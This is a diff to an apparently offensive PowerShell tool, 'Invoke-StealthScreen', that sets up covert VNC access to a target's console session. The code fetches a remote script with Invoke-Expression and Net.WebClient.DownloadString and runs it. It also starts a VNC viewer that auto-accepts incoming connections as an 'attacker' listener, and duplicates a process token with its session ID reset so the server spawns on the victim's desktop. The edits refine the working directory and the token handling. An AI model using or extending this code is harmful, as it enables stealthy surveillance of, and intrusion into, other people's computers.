@@ -23,8 +23,10 @@ function Invoke-StealthScreen {
 
     if ($Mode -eq 'view') {
         $scriptdir = $PSScriptRoot
+        Push-Location $env:TEMP
         if ($scriptdir) { & (Join-Path $scriptdir 'Invoke-VNCViewer.ps1') } else {
             Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1') }
+        Pop-Location
         Start-Process -FilePath "$env:TEMP\VNCViewer.exe" -ArgumentList "/listen $Port /password $Password /nohotkeys /autoacceptincoming" | Out-Null
         Write-Host "[+] Viewer listening on ${AttackerIP}:$Port, spawning server on target console session.." -ForegroundColor Blue
 
@@ -81,9 +83,8 @@ public class WTS {
             [WTS]::CloseHandle($tok) | Out-Null
             $tok = $tok2
         } else {
-            $selfTok = [IntPtr]::Zero
-            [WTS]::OpenProcessToken([WTS]::GetCurrentProcess(), 0x1F01FF, [ref]$selfTok) | Out-Null
-            [WTS]::DuplicateTokenEx($selfTok, 0x1F01FF, [IntPtr]::Zero, 2, 1, [ref]$tok) | Out-Null
+            $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+            [WTS]::DuplicateTokenEx($id.Token, 0x1F01FF, [IntPtr]::Zero, 2, 1, [ref]$tok) | Out-Null
             $sid = $sessId
             [WTS]::SetTokenInformation($tok, 12, [ref]$sid, 4) | Out-Null
             $origin = 'systemtoken'
